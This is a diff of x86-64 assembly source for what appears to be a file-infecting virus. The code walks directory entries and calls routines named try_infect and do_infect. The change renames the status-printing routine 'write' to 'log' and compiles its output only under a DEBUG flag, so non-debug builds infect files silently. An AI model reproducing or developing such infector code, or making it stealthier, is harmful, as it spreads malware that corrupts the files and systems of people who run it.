@@ -186,11 +186,11 @@ _start:
 
         lea rdi, [rel directory_msg]
         mov rsi, 4
-        call write
+        call log
     .read_directory:
         lea rdi, [rel read_directory_msg]
         mov rsi, 15
-        call write
+        call log
 
         mov rdx, DIRENT_ARR_SIZE
         lea rsi, data(dirent_array)
@@ -205,7 +205,7 @@ _start:
     .process_file:
         lea rdi, [rel file_msg]
         mov rsi, 5
-        call write
+        call log
 
         lea rdi, data(dirent_array)
         add rdi, r13
@@ -229,7 +229,7 @@ _start:
     .close_directory:
         lea rdi, [rel close_msg]
         mov rsi, 6
-        call write
+        call log
 
         mov rdi, data(dir_fd)
         mov rax, SYS_CLOSE
@@ -254,7 +254,7 @@ try_infect:
     push rdi
     lea rdi, [rel infect_msg]
     mov rsi, 7
-    call write
+    call log
     pop rdi
     pop rsi
 
@@ -344,7 +344,7 @@ do_infect:
     push rdi
     lea rdi, [rel do_infect_msg]
     mov rsi, 10
-    call write
+    call log
     pop rdi
 
     push r13
@@ -444,9 +444,10 @@ try_open:
     .error:
         jmp rcx
 
-; size_t write(rdi=char*, rsi=len)
+; size_t log(rdi=char*, rsi=len)
 ; Writes rsi bytes of rdi to stdout.
-write:
+log:
+%ifdef DEBUG
     push rdx
     push rsi
 
@@ -458,7 +459,7 @@ write:
 
     pop rsi
     pop rdx
-
+%endif
     ret
 
 exit:
@@ -512,7 +513,7 @@ _host:
     push rdx
     lea rdi, [rel host_msg]
     mov rsi, 5
-    call write
+    call log
     pop rdx
     pop rsi
     pop rdi
